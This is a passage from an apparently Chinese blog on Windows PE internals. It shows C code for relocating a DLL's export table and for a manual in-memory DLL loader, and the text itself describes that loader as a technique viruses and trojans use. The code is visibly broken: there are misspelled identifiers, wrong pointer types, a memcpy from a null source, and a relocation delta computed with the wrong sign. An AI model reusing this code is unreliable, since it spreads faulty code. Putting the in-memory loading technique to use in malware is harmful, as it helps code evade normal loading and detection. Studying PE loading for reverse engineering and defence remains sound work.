4;复制AddressOfNameOrdinals(函数序号表);长度: NumberOfNames * 2;复制AddressOfNames(函数名称表);长度: NumberOfNames * 4;复制所有函数名;长度不确定, 复制时直接修复AddressOfNames;复制IMAGE_EXPORT_DIRECTORY结构;修复IMAGE_EXPORT_DIRECTORY结构中的AddressOfFunctions、AddressOfNameOrdinals、AddressOfNames;修复目录项中的值, 指向新的IMAGE_EXPORT_DIRECTORY; RVA转FOA 将RVA转换成FOA 123456789101112131415161718DWORD RVA2FOA(DWORD dwRVA, LPVOID lpBuffer)&#123; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); IMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt); if(dwRVA &lt; pSec[0].VirtualAddress) &#123; return dwRVA; &#125; for(size_t i=0; i&lt;pNt-&gt;FileHeader.NumberOfSections; i++) &#123; if(dwRVA &gt;= pSec[i].VirtualAddress &amp;&amp; dwRVA &lt;= pSec[i].VirtualAddress + pSec[i].Misc.VirtualSize) &#123; return dwRVA - pSec[i].VirtualAddress + pSec[i].PointerToRawData; &#125; &#125; return dwRVA;&#125; FOA转RVA 将FOA转换成RVA 123456789101112131415161718DWORD FOA2RVA(DWORD dwFOA, LPVOID lpBuffer)&#123; IMAGE_DOS_HEADER pDos = (IMAGE_DOS_HEADER)lpBuffer; IMAGE_NT_HEADERS pNt = (IMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); IMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt); if(dwFOA &lt; pSec[0].PointerToRawData) &#123; return dwFOA; &#125; for(size_t i=0;i&lt;pNt-&gt;FileHeader.NumberOfSections;i++) &#123; if(dwFOA &gt;= pSec[i].PointerToRawData &amp;&amp; dwFOA &lt; (pSec[i].PointerToRawData + pSec[i].SizeOfRawData)) &#123; return pSec[i].VirtualAddress + dwFOA - pSec[i].PointerToRawData; &#125; &#125; return dwFOA;&#125; 移动导出表具体步骤1. 将Dll文件读入内存123456789101112131415161718192021222324252627282930char* szFilePath = &quot;xxx&quot;;HANDLE hFile = CreateFileA( szFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);if(hFile == INVALID_HANDLE_VALUE)&#123; printf(&quot;CreateFileA Failed\\n&quot;); return 0;&#125;DWORD dwFileSize = GetFileSize(hFile, NULL);printf(&quot;dwFileSize: %d\\n&quot;, dwFileSize);LPVOID lpData = new BYTE[dwFileSize];if(lpData == NULL)&#123; printf(&quot;申请内存失败\\n&quot;); return 0;&#125;DWORD dwRead = 0;if(FALSE == ReadFile(hFile, lpData, dwFileSize, &amp;dwRead, NULL))&#123; printf(&quot;ReadFile Failed\\n&quot;); return 0;&#125;printf(&quot;lpData: %x\\n&quot;, *(short*)lpData); 2. 新增节表1234567891011121314151617181920212223242526272829// 解析PE文件IMAGE_DOS_HEADER pDos = (IMAGE_DOS_HEADER)lpData;IMAGE_NT_HEADERS pNt = (IMAGE_NT_HAEDERS)(pDos-&gt;e_lfanew + (DWORD)lpData);PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);// 新增节表PIMAGE_SECTION_HEADER pNewSec = pSec + pNt-&gt;FileHeader.NumberOfSections;if(((DWORD)lpData + pNt-&gt;OptionalHeader.SizeOfHeaders - (DWORD)pNewSec) &lt; 80)&#123; printf(&quot;空间不足新增节表失败\\n&quot;); return 0;&#125;// 设置新接节表strcpy((char*)(pNewSec-&gt;Name), &quot;.export&quot;);pNewSec-&gt;Misc.VirtualSize = 0x1000;pNewSec-&gt;VirtualAddress = pNt-&gt;OptionalHeader.SizeOfImage;pNewSec-&gt;SizeOfRawData = 0x1000;PIMAGE_SECTION_HEADER pLastSec = pSec + (pNt-&gt;FileHeader.NumberOfSections - 1);pNewSec-&gt;PointerToRawData = pLastSec-&gt;PointerToRawData + pLastSec-&gt;SizeOfRawData;pNewSec-&gt;Characteristics = pSec[1].Characteristics;// 设置全0节表memset((LPVOID)(pNewSec + 1), 0, 40);// 修正头部信息pNt-&gt;FileHeader.NumberOfSections += 1;pNt-&gt;OptionalHeader.SizeOfImage += 0x1000; 3. 复制导出表12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// 申请内存LPVOID lpSecMemory = new BYTE[0x1000];if(lpSecMemory == NULL)&#123; printf(&quot;申请内存失败\\n&quot;); return 0;&#125;// 解析导出表PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT);PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(RVA2FOA(pDir-&gt;VirtualAddress, lpData) + (DWORD)lpData);printf(&quot;NumberOfNames: %d\\n&quot;, pExport-&gt;NumberOfNames);// 复制函数地址表// 长度 NumberOfFunctions * 4LPVOID lpCopyDest = lpSecMemory;LPDWORD lpNewFuncAddr = (LPDWORD)lpCopyDest;LPVOID lpFuncAddr = (LPVOID)(RVA2FOA(pExport-&gt;AddressOfFunctions, lpData) + (DWORD)lpData);memcpy(lpCopyDest, lpFuncAddr, pExport-&gt;NumberOfFunctions * 4);printf(&quot;lpSecMemory =&gt; AddressOfFunctions: %x\\n&quot;, *(int*)lpSecMemory);printf(&quot;pExport-&gt;AddressOfFuntions: %x\\n&quot;, *(int*)(RVA2FOA(pExport-&gt;AddressOfFunctions, lpData) + (DWORD)lpData));// 复制函数序号表// 长度 NumberOfNames * 2lpCopyDest = (LPVOID)((DWORD)lpSecMemory + pExport-&gt;AddressOfFunctions * 4);LPDWORD lpNewOrdAddr = (LPDWORD)lpCopyDest;LPVOID lpOrdAddr = (LPVOID)(RVA2FOA(pExport-&gt;AddressOfNameOrdinals, lpData) + (DWORD)lpData);memcpy(lpCopyDest, lpOrdAddr, pExport-&gt;NumberOfNames * 2);printf(&quot;lpSecMemory =&gt; AddressOfNameOrdinals: %x\\n&quot;, *(char*)((DWORD)lpSecMemory + pExport-&gt;NumberOfFunctions * 4));printf(&quot;pExport-&gt;AddressOfNameOrdinals: %x\\n&quot;, *(char*)(RVA2FOA(pExport-&gt;AddressOfNameOrdinals, lpData) + (DWORD)lpData));// 复制函数名称表// 长度 NumberOfNames * 4lpCopyDest = (LPVOID)((DWORD)lpSecMemory + pExport-&gt;NumberOfNames * 2);LPDWORD lpNewNameAddr = (LPDWORD)lpCopyDest;LPDWORD lpNameAddr = (LPDWORD)(RVA2FOA(pExport-&gt;AddressOfNames, lpData) + (DWORD)lpData);memcpy(lpCopyDest, 0, pExport-&gt;NumberOfNames * 4);// 复制函数名称并修复名称表lpCopyDest = (LPVOID)((DWORD)lpSecMemory + pExport-&gt;NumberOfNames * 4);for(size_t i=0; i&lt;pExoprt-&gt;NumberOfNames; i++)&#123; LPSTR lpFuncName = (LPSTR)(RVA2FOA(lpNameAddr[i], lpData) + (DWORD)lpData); printf(&quot;lpFuncName: %s\\n&quot;, lpFuncName); DWORD dwFuncLen = strlen(lpFuncName) + 1; memcpy(lpCopyDest, lpFuncName, dwFuncLen); *(lpNewFuncAddr + i) = FOA2RVA((dwFileSize + (DWORD)lpCopyDest - (DWORD)lpSecMemory), lpData); lpCopyDest = (LPVOID)((DWORD)lpCopyDest + dwFuncLen);&#125;printf(&quot;lpSecMemory =&gt; AddressOfNames: %s\\n&quot;, ((DWORD)lpSecMemory + pExport-&gt;NumberOfFunctions * 4 + pExport-&gt;NumberOfNames * 2 + pExport-&gt;NumberOfNames * 4));printf(&quot;pExport-&gt;AddressName: %s\\n&quot;, (RVA2FOA(lpNewFuncAddr[0], lpData) + (DWORD)lpData));// 复制导出表memcpy(lpCopyDest, pExport, pDir-&gt;Size);PIMAGE_EXPORT_DIRECTORY pNewExport = (PIMAGE_EXPORT_DIRECTORY)lpCopyDest;pNewExport-&gt;AddressOfFunctions = FOA2RVA((dwFileSize + (DWORD)lpNewFuncAddr - (DWORD)lpSecMemory), lpData);pNewExoprt-&gt;AddressOfNameOrdinals = FOA2RVA((dwFileSize + (DWORD)lpNewOrdAddr - (DWORD)lpSecMemory), lpData);pNewExport-&gt;AddressOfNames = FOA2RVA((dwFileSize + (DWORD)lpNewNameAddr - (DWORD)lpSecMemory), lpData);// 修复数据目录pNt-&gt;OptionalHeader.DataDirectory[0].VirtualAddress = FOA2RVA((dwFileSize + (DWORD)pNewExport - (DWORD)lpSecMemory), lpData); 4. 将数据写入文件1234567891011121314151617181920212223242526FILE* newFile = fopen(&quot;xxx&quot;, &quot;a+b&quot;);if(!newFile)&#123; printf(&quot;打开新文件失败\\n&quot;); return 0;&#125;size_t m = fwrite(lpData, dwFileSize, 1, newFile);if(!m)&#123; printf(&quot;写出文件第一部分失败\\n&quot;); fclose(newFile); return 0;&#125;// 写出新节size_t n = fwrite(lpSecMemory, 0x1000, 1 , newFile);if(!n)&#123; printf(&quot;写出文件第二部分失败\\n&quot;); fclose(newFile); return 0;&#125;// 关闭文件并返回fclose(newFile);printf(&quot;移动导出表成功\\n&quot;);return 0; 5. 调用新导出表12345678910typedef void (*MyShowMessage)();HMODULE hDll = LoadLibraryA(&quot;xxx&quot;);if(hDll == NULL)&#123; printf(&quot;LoadLibrary Failed\\n&quot;); return 0;&#125;MyShowMessage myShowMessage = (MyShowMessage)GetProcAddress(hDll, &quot;ShowMessage&quot;);myShowMessage();FreeLibrary(hDll); 运行成功 dllmain.cpp1234567891011121314151617181920212223242526// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;#include &lt;Windows.h&gt;extern &quot;C&quot; __declspec(dllexport) void ShowMessage()&#123; MessageBox(NULL, L&quot;I`m DLL File&quot;, L&quot;HELLO&quot;, MB_OK);&#125;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;","categories":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/categories/Windows-PE/"}],"tags":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/tags/Windows-PE/"}]},{"title":"手工模拟PE加载器","slug":"手工模拟PE加载器","date":"2023-12-14T13:13:16.000Z","updated":"2024-03-12T15:53:06.696Z","comments":true,"path":"dbdbea24.html","link":"","permalink":"http://example.com/dbdbea24.html","excerpt":"内存直接加载运行病毒木马具有模拟PE加载器的功能, 它们可以把DLL或者exe等PE文件从内存中直接加载到病毒木马的内存中去执行, 不需要通过LoadLibrary等现成的API函数去操作;假如程序需要动态调用DLL文件, 内存加载运行技术可以把DLL作为资源插入到自己的程序中, 此时可直接在内存中加载运行即可;内存加载技术的核心就在于模拟PE加载器PE文件, 也就是对导入表、导出表、重定位表的操作过程;","text":"内存直接加载运行病毒木马具有模拟PE加载器的功能, 它们可以把DLL或者exe等PE文件从内存中直接加载到病毒木马的内存中去执行, 不需要通过LoadLibrary等现成的API函数去操作;假如程序需要动态调用DLL文件, 内存加载运行技术可以把DLL作为资源插入到自己的程序中, 此时可直接在内存中加载运行即可;内存加载技术的核心就在于模拟PE加载器PE文件, 也就是对导入表、导出表、重定位表的操作过程; 实现原理首先, 需要将DLL文件加载到内存中, 按照映像大小进行对齐后映射到内存中, 然后根据重定位表修改硬编码数据, 最后根据导出表函数地址修正导入表; 流程总结根据映像大小SizeOfImage申请可读可写可执行的内存空间, 首地址即DLL加载基址;获取其映像对齐大小SectionAlignment并复制到该内存空间中（FileBuffer &#x3D;&gt; ImageBuffer）;修正重定位表;修正导入表, 根据PE结构中的导入表, 加载所需的Dll, 并获取导入函数的地址将其写入导入表中;修改DLL的加载基址ImageBase;获取DLL入口地址, 构造DllMain函数实现加载; 对于exe文件, 重定位表不是必须的。因为对于exe进程来说, 进程最早加载的模块是exe模块, 所以它可以按照默认加载基址加载到内存中; exe和Dll唯一的区别在于构造入口函数的差别, exe不需要构造入口函数, 而是根据PE结构获取exe的入口地址偏移AddressOfEntryPoint并计算出入口地址, 然后直接跳转。 1. 将Dll文件读入内存PELodader_Demo.cpp1234567891011121314151617181920212223242526272829303132wchat_t szFileName[MAX_PATH] = L&quot;C:\\\\Users\\\\dell\\\\OneDrive\\\\桌面\\\\哔哩哔哩学习\\\\PE Learn\\\\PELoader_Demo\\\\Debug\\\\TestDLL_01.dll&quot;;HANDLE hFile = CreateFile( szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);if (hFile == INVALID_HANDLE_VALUE)&#123; printf(&quot;CreateFile Failed\\n&quot;); return 1;&#125;DWORD dwFileSize = GetFileSize(hFile, NULL);printf(&quot;GetFileSize: %d\\n&quot;, dwFileSize);// 申请动态内存PBYTE lpData = new BYTE[dwFileSize];if (NULL == lpData)&#123; printf(&quot;申请内存出错\\n&quot;); return 1;&#125;// 将文件读取到内存中DWORD dwRead = 0;if (FALSE == ReadFile(hFile, lpData, dwFileSize, &amp;dwRead, NULL))&#123; printf(&quot;ReadFile Failed\\n&quot;); return 1;&#125;printf(&quot;lpData: %08x\\n&quot;, *(short*)lpData); // 5A4D CreateFile 创建或打开文件或I&#x2F;O设备, 此函数区分多字节和Unicode两种模式 12345678910111213// UNICODEHANDLEWINAPICreateFileW( _In_ LPCWSTR lpFileName, // 要创建或打开的文件或设备名称 _In_ DWORD dwDesiredAccess, // 请求对文件或设备的访问权限, 常用值GENERIC_READ、GENERIC_WRITE _In_ DWORD dwShareMode, // 请求的文件或设备的共享模式（可以是读取、写入、删除） _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, // 指向LPSECURITY_ATTRIBUTES结构的指针, 此参数可以为NULL _In_ DWORD dwCreationDisposition, // 要对存在或不存在的文件或设备执行的操作, 此参数通常设置为OPEN_EXISTING _In_ DWORD dwFlagsAndAttributes, // 文件或设备属性和标志 _In_opt_ HANDLE hTemplateFile // 具有GENERIC_READ访问权限的模板文件的有效句柄, 此参数可以为NULL ); 如果函数成功, 则返回值是指定文件、设备、命名管道或邮件槽的打开句柄;如果函数失败, 则返回值为INVALID_HANDLE_VALUE; GetFileSize 检索指定文件的大小（以字节为单位） 123456DWORDWINAPIGetFileSize( _In_ HANDLE hFile, // 文件句柄 _Out_opt_ LPDWORD lpFileSizeHigh // 指向变量的指针, 其中返回了文件大小的高位双字。如果应用程序不需要高位双字, 此参数可以为NULL ); 如果函数成功, 则返回值为文件大小的低位双字, 如果lpFileSizeHigh为非NULL, 则该函数会将文件大小的高位双字放入该参数指向的变量中;如果函数失败且lpFileSizeHigh为NULL, 则返回值INVALID_FILE_SIZE; ReadFile 从指定的文件或输入&#x2F;输出 (I&#x2F;O) 设备读取数据 123456789BOOLWINAPIReadFile( _In_ HANDLE hFile, // 文件/设备句柄 _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesRead) __out_data_source(FILE) LPVOID lpBuffer, // 指向接收从文件或设备读取的数据的缓冲区的指针 _In_ DWORD nNumberOfBytesToRead, // 要读取的最多字节数 _Out_opt_ LPDWORD lpNumberOfBytesRead, // 指向变量的指针 _Inout_opt_ LPOVERLAPPED lpOverlapped // 此参数可为NULL ); 如果函数成功，则返回值为非零 (TRUE);如果函数失败或正在异步完成，则返回值为零 (FALSE); 2. FileBuffer &#x3D;&gt; ImageBuffer将FileBuffer转换成ImageBuffer可以分为两步: 先将PE头部复制至内存中;然后循环将节内容复制过去; 代码示例 123456789101112131415161718192021222324252627BOOL MmMapFile(LPVOID lpData, LPVOID lpBaseAddress)&#123; // 解析PE文件格式 PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpData; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)lpData); // 获取PE header大小 DWORD dwSizeOfHeaders = pNt-&gt;OptionalHeader.SizeOfHeaders; // 获取节数量 DWORD dwNumOfSections = pNt-&gt;FileHeader.NumberOfSections; // 将头部数据复制过去 RtlCopyMemory(lpBaseAddress, lpData, dwSizeOfHeaders); // 解析第一个节 PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt); // 循环节 for(size_t i = 0; i &lt; dwNumOfSections; i++) &#123; if((0 == pSec[i].VirtualAddress) || (0 == pSec[i].PointerToRawData)) &#123; continue; &#125; LPVOID lpSrcMem = (LPVOID)(pSec[i].PointerToRawData + (DWORD)lpData); LPVOID lpDesMem = (LPVOID)(pSec[i].VirtualAddress + (DWORD)lpBaseAddress); DWROD dwSizeOfRawData = pSec[i].SizeOfRawData; RtlCopyMemory(lpDesMem, lpSrcMem, dwSizeOfRawData); &#125; return TRUE;&#125; 3. 修正重定位表重定位表Relocation(重定位)是一种将程序中的一些地址修正为运行时可用的实际地址的机制。在程序编译过程中, 由于程序中使用了各种全局变量和函数, 这些变量和函数的地址还没有确定, 因此它们的地址只能暂时使用一个相对地址。当程序被加载到内存中运行时, 这些相对地址需要被修正为实际的绝对地址, 这个过程就是重定位;在Windows操作系统中, 程序被加载到内存中运行时, 需要将程序中的各种内存地址进行重定位, 以使程序能正确运行。Windows系统使用PE(Portable Executable)文件格式来存储可执行程序, 其中包括重定位信息。当程序被加载到内存中时, 系统会解析这些重定位信息, 并将程序中的各种内存地址进行重定位。重定位表一般出现在Dll中, 因为Dll都是动态加载, 所以地址不固定, Dll的入口点在整个执行过程中至少要执行2次, 一次时在开始时执行初始化工作, 一次则是在结束时做最后的收尾工作, 重定位表则是解决Dll的地址问题; 重定位表的结构 重定位结构 代码示例 1234567891011121314151617181920212223242526272829303132333435363738394041424344BOOL DoRelocationTable(LPVOID lpBaseAddress)&#123; // 解析PE PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)lpBaseAddress); // 定位重定位位置 PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_BASERELOC); // 获取重定位表 PIMAGE_BASE_RELOCATION pLoc = (PIMAGE_BASE_RELOCATION)(pDataDir-&gt;VirtualAddress + (DWORD)lpBaseAddress); // 判断是否有重定位表, 数据目录表不存在时, VirtualAddress为0, 也就是指向映像基址 if ((LPVOID)pLoc == lpBaseAddress) &#123; return FALSE; &#125; // 循环重定位表, 重定位表VirtualAddress和SizeOfBlock都为0表示重定位表结束 while((pLoc.VirtualAddress + pLoc-&gt;SizeOfBlock) != 0) &#123; // 重定位数据, 位于IMAGE_BASE_RELOCATION表开头8字节之后 PWORD pLocData = (PWORD)((PBYTE)pLoc + szieof(IMAGE_BASE_RELOCATION)); // 计算本节需要修正的重定位项（地址）的数目, 每个数据都是16字节（4+12字节, 高4位表示重定位类型, 低12位为RVA） // SizeOfBlock的值包括了SizeOfBlock和VirtualAddress的大小, 8字节需要减去 DWORD dwNumOfpLoc = (pLoc-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); for (size_t i = 0; i &lt; dwNumOfpLoc; i++) &#123; // 高位为3表示有效重定位 if ((DWORD)(pLocData[i] &amp; 0x0000F000) == 0x00003000) &#123; // 需要修正的数据 // 修正重定位数据, 重定位表记录的是存在硬编码的地址, 以基址+偏移的形式 // 存在硬编码的地址 = 重定位基址 + 重定位表数据偏移 // = 基址 + 重定位地址 + 重定位数据（数据后12位） PDWORD pAddress = (PDWORD)((PBYTE)pDos + pLoc-&gt;VirtualAddress + (pLocData[i] &amp; 0x0FFF)); // 重定位地址 = 硬编码地址 - ImageBase + 实际基地址 // = 实际基地址 - ImageBase + 硬编码地址 // *pAddress = *pAddress - pNt-&gt;OptionalHeader.ImageBase + (DWORD)pDos; DWROD dwDelta = (DWORD)pDos + pNt-&gt;OptionalHeader.ImageBase; *pAddress += dwDelta; &#125; &#125; // 循环下一个重定位区段 pLoc = (PIMAGE_BASE_RELOCATION)((PBYTE)pLoc + pLoc-&gt;SizeOfBlock); &#125; return TRUE;&#125; 4. 修正导入表PE加载器在加载PE的时候会将导入函数的地址填入导入地址表中, 导入表结构如下: 123456789101112131415typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; // 0 for terminating null import descriptor DWORD OriginalFirstThunk; // RVA to original unbound IAT (PIMAGE_THUNK_DATA) 导入名称表RVA &#125; DUMMYUNIONNAME; DWORD TimeDateStamp; // 0 if not bound, // -1 if bound, and real date\\time stamp // in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND) // O.W. date/time stamp of DLL bound to (Old BIND) DWORD ForwarderChain; // -1 if no forwarders DWORD Name; DWORD FirstThunk; // RVA to IAT (if bound this IAT has actual addresses) 导入地址表RVA&#125; IMAGE_IMPORT_DESCRIPTOR;typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; 主要用到的是OriginalFirstThunk和FirstThunk; 这两个表用到的结构体是一样的(IMAGE_THUNK_DATA): 123456789typedef struct _IMAGE_THUNK_DATA32 &#123; union &#123; DWORD ForwarderString; // PBYTE DWORD Function; // PDWORD DWORD Ordinal; DWORD AddressOfData; // PIMAGE_IMPORT_BY_NAME &#125; u1;&#125; IMAGE_THUNK_DATA32;typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32; 如果指向导入名称表; 则内容是AddressOfData, 指向IMAGE_IMPORT_BY_NAME结构体;如果指向导入地址表: 序号导入的话, Ordinal首位是1, 低4位是导入序号; 名称导入的话, Function的值是函数地址; 这里我们需要将导入函数的地址填入导入地址表中, 所以需要知道这个函数是怎么导入的, 然后通过GetProcAddress API获取函数地址, 然后将函数地址填入导入地址表中; 通过GetProcAddress获取函数地址, 需要知道Dll名称, 通过Dll名称获取模块句柄 所以代码流程是: 修正导入表流程先获取导入表数组的数量和第一个成员的地址;根据导入表的数量, 进行循环遍历;获取导入名称表;获取导入地址表;进行导入名称表的遍历(导入名称表数组以0作为最后一个成员结束);获取导入函数的名称或序号；加载这个Dll, 通过名称或序号, 获取其函数地址;将地址填入导入地址表;进入下一次循环;进入下一次循环;两次遍历完成后, 导入表就已经完成了修正; 代码示例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566BOOL DoImportTable(LPVOID lpBaseAddress)&#123; // 解析PE结构 PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_IMPORT); PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pDir-&gt;VirtualAddress + (DWORD)pDos); // 循环遍历Dll导入表中的Dll以及获取导入表中的函数地址 char* szDllName = NULL; HMODULE hDll = NULL; PIMAGE_THUNK_DATA pImportNameArray = NULL; PIMAGE_IMPORT_BY_NAME pImportByName = NULL; PIMAGE_THUNK_DATA pImportFuncAddrArray = NULL; FARPROC pfFuncAddress = NULL; DWORD i = 0; while(TRUE) &#123; if(0 == pImport-&gt;OriginalFirstThunk) &#123; break; &#125; // 获取导入表中Dll的名称并加载Dll szDllName = (char*)(pImport-&gt;Name + (DWORD)pDos); hDll = GetModuleHandleA(szDllName); if(hDll == NULL) &#123; hDll = LoadLibraryA(szDllName); if(hDll == NULL) &#123; pImport++; continue; &#125; &#125; i = 0; // 获取OriginalFirstThunk以及对应的导入函数名称表首地址 pImportNameArray = (PIMAGE_THUNK_DATA)(pImport-&gt;OriginalFirstThunk + (DWORD)pDos); // 获取FirstThunk以及对应的导入函数地址表首地址 pImportFuncAddrArray = (PIMAGE_THUNK_DATA)(pImport-&gt;FirstThunk + (DWORD)pDos); while(TRUE) &#123; if(0 == pImportNameArray[i].u1.AddressOfData) &#123; break; &#125; // 获取IMAGE_IMPORT_BY_NAME结构 pImportByName = (PIMAGE_IMPORT_BY_NAME)(pImportNameArray[i].u1.AddressOfData); // 判断导出函数是序号导出还是函数名称导出 if(0x80000000 &amp; pImportNameArrar[i].u1.Ordinal) &#123; // 序号导出 // 当IMPORT_THUNK_DATA值的最高位为1时, 表示函数以序号方式导出, 此时低位被看作是一个函数序号 pfFuncAddress = GetProcAddress(hDll, (LPCSTR)(pImportNameArray[i].u1.Ordinal &amp; 0x0000FFFF)); &#125; else &#123; // 名称导出 pfFuncAddress = GetProcAddress(hDll, (LPCSTR)pImportByName-&gt;Name); &#125; // 注意此处的函数地址表的赋值, 要对照PE格式进行装载 pImportFuncAddrArray[i].u1.Function = (DWORD)pfFuncAddress; i++; &#125; pImport++; &#125; return TRUE;&#125; 5. 修改Dll的加载基址ImageBasePE加载器在加载PE的时候会将进程分配的基地址填入扩展头的ImageBase中; 12345678BOOL SetImageBase(LPVOID lpBaseAddress)&#123; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); pNt-&gt;OptionalHeader.ImageBase = (DWORD)lpBaseAddress; return TRUE;&#125; 6. 修改DllMain入口点调用Dll的入口函数DllMain, 函数地址则是PE文件的入口点; 1234567891011BOOL CallDllMain(LPVOID lpBaseAddress)&#123; typedef_DllMain DllMain = NULL; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); DllMain = (typedef_DllMain)(pNt-&gt;OptionalHeader.AddressOfEntryPoint + (DWORD)pDos); // 调用入口函数, 附加进程DLL_PROCESS_ATTACH BOOL bRet = DllMain((HINSTANCE)lpBaseAddress, DLL_PROCESS_ATTACH, NULL); return bRet;&#125; 7. 获取Dll导出函数导出表PE文件运行, 需要依赖Dll; 系统Dll包括Kernel32.dll、User32.dll等;导出表时当前PE文件提供了哪些函数给别人使用;不管是exe还是Dll, 本质都是PE文件; exe文件也可以导出函数给别人使用; 一般exe没有, 但不是不可以; 导出表结构 12345678910111213typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; // DWORD TimeDateStamp; // 时间戳, 编译时间; 把秒转为时间, 可以知道这个Dll是什么时候编译出来的 WORD MajorVersion; WORD MinorVersion; DWORD Name; // 指向该导出表文件名的字符串, 也就是这个Dll的名称(RVA) DWORD Base; // 导出函数的起始序号 DWORD NumberOfFunctions; // 所有导出函数的个数 DWORD NumberOfNames; // 以名称导出的函数个数 DWORD AddressOfFunctions; // RVA from base of image（导出的函数地址表） DWORD AddressOfNames; // RVA from base of image（导出的函数名称表） DWORD AddressOfNameOrdinals; // RVA from base of image（导出的函数序号表）&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; 遍历流程获取导出函数名称;比较是否是要找函数名称;如果是, 则获取函数序号(2字节);根据函数序号获取函数地址; 123456789101112131415161718192021222324252627LPVOID MmGetProcAddress(LPVOID lpBaseAddress, wchar_t* lpszFuncName)&#123; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT); PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pDir-&gt;VirtualAddress + (DWORD)pDos); PDWORD dwAddressOfFunctions = (PDWORD)(pExport-&gt;AddressOfFunctions + (DWORD)pDos); PDWORD dwAddressOfNames = (PDWORD)(pExport-&gt;AddressOfNames + (DWORD)pDos); PWORD pwAddressOfNameOrdinals = (PWORD)(pExport-&gt;AddressOfNameOrdinals + (DWORD)pDos); DWORD dwNumberOfNames = pExport-&gt;NumberOfNames; for(size_t i = 0; i &lt; dwNumberOfNames; i++) &#123; if(!dwAddressOfFunctions[i]) &#123; continue; &#125; PWCHAR szFuncName = (PWCHAR)(dwAddressOfNames[i] + (DWORD)pDos); if(lstrcmpi(lpszFuncName, szFuncName) == 0) &#123; return (LPVOID)(dwAddressOfFunctions[pwAddressOfNameOrdinals[i]] + (DWORD)pDos); &#125; &#125; return LPVOID();&#125; 8. 释放内存加载的Dll释放资源 1234567891011BOOL MmFreeLibrary(LPVOID lpBaseAddress)&#123; BOOL bRet = NULL; if (NULL == lpBaseAddress) &#123; return bRet; &#125; bRet = VirtualFree(lpBaseAddress, 0, MEM_RELEASE); lpBaseAddress = NULL; return bRet;&#125; 内存加载Dll执行演示示例Dll源代码12345678910111213141516171819202122// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;extern &quot;C&quot; __declspec(dllexport)void ShowMessage() &#123; MessageBox(NULL, L&quot;I&#x27;m DLL File&quot;, L&quot;HELLO&quot;, MB_OK);&#125;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved 